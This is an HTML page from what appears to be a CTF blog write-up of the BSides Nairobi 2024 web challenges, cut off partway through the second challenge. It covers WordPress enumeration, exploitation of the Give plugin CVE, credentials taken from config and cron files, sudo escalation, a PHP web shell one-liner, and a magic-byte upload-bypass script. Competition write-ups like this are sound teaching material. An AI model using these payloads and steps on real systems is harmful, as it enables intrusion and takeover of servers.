@@ -1,0 +1,942 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Bsides Nairobi Cyberchallennge 2024 writeup This is a writeup for the web challenges in Bsides Nairobi Cyberchallnege held physically at Sarit Expo Center, Nairobi My team p3rf3ctr00t won , for the second year in a row. :) Web category Mr donor Here we are given a wordpress site. With donation forms. So first thing first i use wpscan to enumerate the site. There isint alot of content. 1 2 3 4 use thsi to enumerate the users wpscan --url http://3.">
+<title>BsidesNrb2024</title>
+
+<link rel='canonical' href='https://f0rk3b0mb.github.io/p/bsidesnrb2024/'>
+
+<link rel="stylesheet" href="/scss/style.min.0304c6baf04e01a8fe70693791cb744d56a3578a3120a8796cefc66825aa39c7.css"><meta property='og:title' content="BsidesNrb2024">
+<meta property='og:description' content="Bsides Nairobi Cyberchallennge 2024 writeup This is a writeup for the web challenges in Bsides Nairobi Cyberchallnege held physically at Sarit Expo Center, Nairobi My team p3rf3ctr00t won , for the second year in a row. :) Web category Mr donor Here we are given a wordpress site. With donation forms. So first thing first i use wpscan to enumerate the site. There isint alot of content. 1 2 3 4 use thsi to enumerate the users wpscan --url http://3.">
+<meta property='og:url' content='https://f0rk3b0mb.github.io/p/bsidesnrb2024/'>
+<meta property='og:site_name' content='f0rk3b0mb'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2024-10-26T17:13:14&#43;03:00'/><meta property='article:modified_time' content='2024-10-26T17:13:14&#43;03:00'/>
+<meta name="twitter:site" content="@f0rk3b0mb">
+    <meta name="twitter:creator" content="@f0rk3b0mb"><meta name="twitter:title" content="BsidesNrb2024">
+<meta name="twitter:description" content="Bsides Nairobi Cyberchallennge 2024 writeup This is a writeup for the web challenges in Bsides Nairobi Cyberchallnege held physically at Sarit Expo Center, Nairobi My team p3rf3ctr00t won , for the second year in a row. :) Web category Mr donor Here we are given a wordpress site. With donation forms. So first thing first i use wpscan to enumerate the site. There isint alot of content. 1 2 3 4 use thsi to enumerate the users wpscan --url http://3.">
+  
+    
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-45FL0WGH80"></script>
+      <script>
+        var doNotTrack = false;
+        if ( false ) {
+          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
+          var doNotTrack = (dnt == "1" || dnt == "yes");
+        }
+        if (!doNotTrack) {
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'G-45FL0WGH80');
+        }
+      </script>
+    
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "dark");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/profile_hu9b359325930a7af80b3fcd9ff46fff03_13993_300x0_resize_q75_box.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">😎</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">f0rk3b0mb</a></h1>
+            <h2 class="site-description">Ctf player p3rf3ctr00t_ke | Cybersecurity | Infosec | web_security_analyst</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/f0rk3b0mb'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg width="2500" height="2432" viewBox="0 0 256 249" xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="xMinYMin meet"><g fill="#161614"><path d="M127.505 0C57.095 0 0 57.085 0 127.505c0 56.336 36.534 104.13 87.196 120.99 6.372 1.18 8.712-2.766 8.712-6.134 0-3.04-.119-13.085-.173-23.739-35.473 7.713-42.958-15.044-42.958-15.044-5.8-14.738-14.157-18.656-14.157-18.656-11.568-7.914.872-7.752.872-7.752 12.804.9 19.546 13.14 19.546 13.14 11.372 19.493 29.828 13.857 37.104 10.6 1.144-8.242 4.449-13.866 8.095-17.05-28.32-3.225-58.092-14.158-58.092-63.014 0-13.92 4.981-25.295 13.138-34.224-1.324-3.212-5.688-16.18 1.235-33.743 0 0 10.707-3.427 35.073 13.07 10.17-2.826 21.078-4.242 31.914-4.29 10.836.048 21.752 1.464 31.942 4.29 24.337-16.497 35.029-13.07 35.029-13.07 6.94 17.563 2.574 30.531 1.25 33.743 8.175 8.929 13.122 20.303 13.122 34.224 0 48.972-29.828 59.756-58.22 62.912 4.573 3.957 8.648 11.717 8.648 23.612 0 17.06-.148 30.791-.148 34.991 0 3.393 2.295 7.369 8.759 6.117 50.634-16.879 87.122-64.656 87.122-120.973C255.009 57.085 197.922 0 127.505 0"/><path d="M47.755 181.634c-.28.633-1.278.823-2.185.389-.925-.416-1.445-1.28-1.145-1.916.275-.652 1.273-.834 2.196-.396.927.415 1.455 1.287 1.134 1.923M54.027 187.23c-.608.564-1.797.302-2.604-.589-.834-.889-.99-2.077-.373-2.65.627-.563 1.78-.3 2.616.59.834.899.996 2.08.36 2.65M58.33 194.39c-.782.543-2.06.034-2.849-1.1-.781-1.133-.781-2.493.017-3.038.792-.545 2.05-.055 2.85 1.07.78 1.153.78 2.513-.019 3.069M65.606 202.683c-.699.77-2.187.564-3.277-.488-1.114-1.028-1.425-2.487-.724-3.258.707-.772 2.204-.555 3.302.488 1.107 1.026 1.445 2.496.7 3.258M75.01 205.483c-.307.998-1.741 1.452-3.185 1.028-1.442-.437-2.386-1.607-2.095-2.616.3-1.005 1.74-1.478 3.195-1.024 1.44.435 2.386 1.596 2.086 2.612M85.714 206.67c.036 1.052-1.189 1.924-2.705 1.943-1.525.033-2.758-.818-2.774-1.852 0-1.062 1.197-1.926 2.721-1.951 1.516-.03 2.758.815 2.758 1.86M96.228 206.267c.182 1.026-.872 2.08-2.377 2.36-1.48.27-2.85-.363-3.039-1.38-.184-1.052.89-2.105 2.367-2.378 1.508-.262 2.857.355 3.049 1.398"/></g></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://ke.linkedin.com/in/abel-biketi-261212257'
+                        target="_blank"
+                        title="linkedin"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg height="2500" width="2490" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 256"><g fill="none"><path d="M0 18.338C0 8.216 8.474 0 18.92 0h218.16C247.53 0 256 8.216 256 18.338v219.327C256 247.79 247.53 256 237.08 256H18.92C8.475 256 0 247.791 0 237.668V18.335z" fill="#069"/><path d="M77.796 214.238V98.986H39.488v115.252H77.8zM58.65 83.253c13.356 0 21.671-8.85 21.671-19.91-.25-11.312-8.315-19.915-21.417-19.915-13.111 0-21.674 8.603-21.674 19.914 0 11.06 8.312 19.91 21.169 19.91h.248zM99 214.238h38.305v-64.355c0-3.44.25-6.889 1.262-9.346 2.768-6.885 9.071-14.012 19.656-14.012 13.858 0 19.405 10.568 19.405 26.063v61.65h38.304v-66.082c0-35.399-18.896-51.872-44.099-51.872-20.663 0-29.738 11.549-34.78 19.415h.255V98.99H99.002c.5 10.812-.003 115.252-.003 115.252z" fill="#fff"/></g></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com/f0rk3b0mb'
+                        target="_blank"
+                        title="twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg clip-rule="evenodd" fill-rule="evenodd" height="1684" stroke-linejoin="round" stroke-miterlimit="2" viewBox="-89.00934757 -46.8841404 643.93723344 446.8841404" width="2500" xmlns="http://www.w3.org/2000/svg"><path d="m154.729 400c185.669 0 287.205-153.876 287.205-287.312 0-4.37-.089-8.72-.286-13.052a205.304 205.304 0 0 0 50.352-52.29c-18.087 8.044-37.55 13.458-57.968 15.899 20.841-12.501 36.84-32.278 44.389-55.852a202.42 202.42 0 0 1 -64.098 24.511c-18.42-19.628-44.644-31.904-73.682-31.904-55.744 0-100.948 45.222-100.948 100.965 0 7.925.887 15.631 2.619 23.025-83.895-4.223-158.287-44.405-208.074-105.504a100.739 100.739 0 0 0 -13.668 50.754c0 35.034 17.82 65.961 44.92 84.055a100.172 100.172 0 0 1 -45.716-12.63c-.015.424-.015.837-.015 1.29 0 48.903 34.794 89.734 80.982 98.986a101.036 101.036 0 0 1 -26.617 3.553c-6.493 0-12.821-.639-18.971-1.82 12.851 40.122 50.115 69.319 94.296 70.135-34.549 27.089-78.07 43.224-125.371 43.224a204.9 204.9 0 0 1 -24.078-1.399c44.674 28.645 97.72 45.359 154.734 45.359" fill="#1da1f2" fill-rule="nonzero"/></svg>
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/posts' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="5" cy="19" r="1" />
+  <path d="M4 4a16 16 0 0 1 16 16" />
+  <path d="M4 11a9 9 0 0 1 9 9" />
+</svg>
+
+
+
+                
+                <span>posts</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/about' target="_blank">
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>about</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#web-category">Web category</a>
+      <ol>
+        <li><a href="#mr-donor">Mr donor</a></li>
+        <li><a href="#pixel-blunder">Pixel Blunder</a></li>
+        <li><a href="#faceoff">Faceoff</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/bsidesnrb2024/">BsidesNrb2024</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Oct 26, 2024</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    5 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="bsides-nairobi-cyberchallennge-2024-writeup">Bsides Nairobi Cyberchallennge 2024 writeup
+</h1><p>This is a writeup for the web challenges in Bsides Nairobi Cyberchallnege held physically at Sarit Expo Center, Nairobi</p>
+<p>My team p3rf3ctr00t won , for the second year in a row. :)</p>
+<h2 id="web-category">Web category
+</h2><hr>
+<h3 id="mr-donor">Mr donor
+</h3><p>Here we are given a wordpress site. With donation forms.</p>
+<p>So first thing first i use wpscan to enumerate the site. There isint alot of content.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">use</span> <span class="n">thsi</span> <span class="n">to</span> <span class="n">enumerate</span> <span class="n">the</span> <span class="n">users</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">wpscan</span> <span class="o">--</span><span class="n">url</span>  <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">3.85</span><span class="o">.</span><span class="mf">212.227</span><span class="o">/</span> <span class="o">-</span><span class="n">e</span> <span class="n">u</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>we get one user - admin_magharibi</p>
+<p>From  the scan we can alse see that there is a plugin called &ldquo;give&rdquo; version 3.41.0</p>
+<p>Looking on the internet we can see that it is vulnerable to CVE-2024-5932  so we can achieve code execution.</p>
+<p>I used this exploit &raquo; <a class="link" href="https://github.com/EQSTLab/CVE-2024-5932"  target="_blank" rel="noopener"
+    >here</a></p>
+<p>In the shell we can see that there are 3 users</p>
+<p>backup_svc
+ctfroom
+ubuntu</p>
+<p>checking the contents of wp-config.php</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/** Database username */
+</span></span><span class="line"><span class="cl">define( &#39;DB_USER&#39;, &#39;wordpressuser&#39; );
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/** Database password */
+</span></span><span class="line"><span class="cl">define( &#39;DB_PASSWORD&#39;, &#39;roomctfpassword&#39; );
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/** Database hostname */
+</span></span><span class="line"><span class="cl">define( &#39;DB_HOST&#39;, &#39;localhost&#39; );
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/** Database charset to use in creating database tables. */
+</span></span><span class="line"><span class="cl">define( &#39;DB_CHARSET&#39;, &#39;utf8&#39; );
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/** The database collate type. Don&#39;t change this if in doubt. */
+</span></span><span class="line"><span class="cl">define( &#39;DB_COLLATE&#39;, &#39;&#39; );
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/**#@+
+</span></span><span class="line"><span class="cl"> * Authentication unique keys and salts.
+</span></span><span class="line"><span class="cl"> *
+</span></span><span class="line"><span class="cl"> * Change these to different unique phrases! You can generate these using
+</span></span><span class="line"><span class="cl"> * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
+</span></span><span class="line"><span class="cl"> *
+</span></span><span class="line"><span class="cl"> * You can change these at any point in time to invalidate all existing cookies.
+</span></span><span class="line"><span class="cl"> * This will force all users to have to log in again.
+</span></span><span class="line"><span class="cl"> *
+</span></span><span class="line"><span class="cl"> * @since 2.6.0
+</span></span><span class="line"><span class="cl"> */
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">define(&#39;AUTH_KEY&#39;,         &#39;&amp;p`1&amp;)?&gt;Qk=gl`- GRBr^tuc~=M?CSa^jx *?9Tk`+pj?fndQg{&amp;|~SUtf8+K9FN&#39;);
+</span></span><span class="line"><span class="cl">define(&#39;SECURE_AUTH_KEY&#39;,  &#39;Okb-xgA4s`znPZ7?gxIdM$)kQFHcvskp&amp; )K67 -YM_rftdk#:0.0B}}q?VaK&lt;z&lt;&#39;);
+</span></span><span class="line"><span class="cl">define(&#39;LOGGED_IN_KEY&#39;,    &#39;%3$eB%Ne%]s1= `I{5vOs2? EBbn@&amp;{|&gt;.sO?is~XzAN%&lt;O*x-}*k+v}@Xg9RMrD&#39;);
+</span></span><span class="line"><span class="cl">define(&#39;NONCE_KEY&#39;,        &#39;$#JLk_v+0T6?i)[sJ(Q#f--bsbIO`KS(&gt;}Foz55T|QU-;+L_7sqr{7oEj/m$_.yF&#39;);
+</span></span><span class="line"><span class="cl">define(&#39;AUTH_SALT&#39;,        &#39;EdGSntZ*0j&gt;pc&lt;^-l^1q`6o^Yf]s|&amp;2BI t|1nwes:i&lt;$jLx*1tJ1~5p)C(}|U-k&#39;);
+</span></span><span class="line"><span class="cl">define(&#39;SECURE_AUTH_SALT&#39;, &#39;+O%(gn.H`zB)znBcp^TR#5EjM`(C&gt;&amp;wX|BGD#rJX?v#bU;OLEzdeoD`.c1_i`Svo&#39;);
+</span></span><span class="line"><span class="cl">define(&#39;LOGGED_IN_SALT&#39;,   &#39;G5x3@)Uw`++abxv sAMrkZtS*`87cfDX&gt;bh-L|SIN!/bZV*^[wC+] nyLP&lt;e6JY]&#39;);
+</span></span><span class="line"><span class="cl">define(&#39;NONCE_SALT&#39;,       &#39;MXp}(a| 7+TGK9-f2-a9*7@Xv}$6h-N&lt;Z13a@_KlF+|Ugo-3&lt;jHcX&lt;WO[hy?XG ]&#39;);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can login to the database and read the wordpress users and their passwords. I found the following hash for   admin_magharibi: $P$BHFeuYRoSbViPBhP11FqGR0OQ.6N981.</p>
+<p><img src="/images/bsides2024/db.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="db"
+	
+	
+></p>
+<p>I started cracking it in the background while i looked around. Checking the crontab&hellip;</p>
+<p><img src="/images/bsides2024/cron.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="cron"
+	
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="mi">0</span> <span class="mi">0</span> <span class="o">*</span> <span class="o">*</span> <span class="mi">0</span> <span class="n">sshpass</span> <span class="o">-</span><span class="n">p</span> <span class="s1">&#39;vnG^W6q%zjt^S&#39;</span> <span class="n">ssh</span> <span class="o">-</span><span class="n">o</span> <span class="n">StrictHostKeychecking</span><span class="o">=</span><span class="n">no</span> <span class="o">-</span><span class="n">o</span> <span class="n">UserKnownHostsFile</span><span class="o">=/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>  <span class="n">backup_svc</span><span class="err">@</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span> <span class="s2">&#34;cp -R /var/www/wordpress /wp_backup&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>as you can see teh backup_svc userpassword is exposed.</p>
+<p>Login via ssh ad backup_svc, checking what the user can run as sudo&hellip;</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">sudo -l
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">we see that the can run any command as sudo without sudo password
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We get bash shell ad read the flag</p>
+<p>372ae41683bd87573a4902d1ed2d58ad</p>
+<p><img src="/images/bsides2024/root.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="root"
+	
+	
+></p>
+<hr>
+<h3 id="pixel-blunder">Pixel Blunder
+</h3><p>This challenge gave a web interface with a file upload functionality. Seeing this it should click immediately that we are testing file upload bypasses.</p>
+<p>The site was checking if the image was valid through the magic bytes.</p>
+<p>So we need to craft a php shell with png magic bytes.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php system($_GET[&#39;cmd&#39;]);?&gt; 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>You can use a full php reverseshell as the payload , i use this since ive mastered it offhead.</p>
+<p><img src="/images/bsides2024/conv.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="conv"
+	
+	
+></p>
+<p>Add magic bytes at it now identifies as a png, ill leave the python script below for future reference</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">import argparse
+</span></span><span class="line"><span class="cl">import os
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">def add_hex_to_file(file_path, hex_string, position):
+</span></span><span class="line"><span class="cl">    # Convert hex string to bytes
+</span></span><span class="line"><span class="cl">    hex_data = bytes.fromhex(hex_string)
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    # Read the original file content
+</span></span><span class="line"><span class="cl">    with open(file_path, &#39;rb&#39;) as f:
+</span></span><span class="line"><span class="cl">        original_content = f.read()
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    # Modify content based on the specified position
+</span></span><span class="line"><span class="cl">    if position == &#34;start&#34;:
+</span></span><span class="line"><span class="cl">        modified_content = hex_data + original_content
+</span></span><span class="line"><span class="cl">    elif position == &#34;end&#34;:
+</span></span><span class="line"><span class="cl">        modified_content = original_content + hex_data
+</span></span><span class="line"><span class="cl">    elif position.isdigit():
+</span></span><span class="line"><span class="cl">        offset = int(position)
+</span></span><span class="line"><span class="cl">        modified_content = original_content[:offset] + hex_data + original_content[offset:]
+</span></span><span class="line"><span class="cl">    else:
+</span></span><span class="line"><span class="cl">        raise ValueError(&#34;Invalid position. Use &#39;start&#39;, &#39;end&#39;, or an integer for custom offset.&#34;)
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    # Write the modified content back to the file
+</span></span><span class="line"><span class="cl">    with open(file_path, &#39;wb&#39;) as f:
+</span></span><span class="line"><span class="cl">        f.write(modified_content)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    print(f&#34;Hex data added to {file_path} at position: {position}&#34;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">if __name__ == &#34;__main__&#34;:
+</span></span><span class="line"><span class="cl">    parser = argparse.ArgumentParser(description=&#34;Add hex data to a file at a specified position.&#34;)
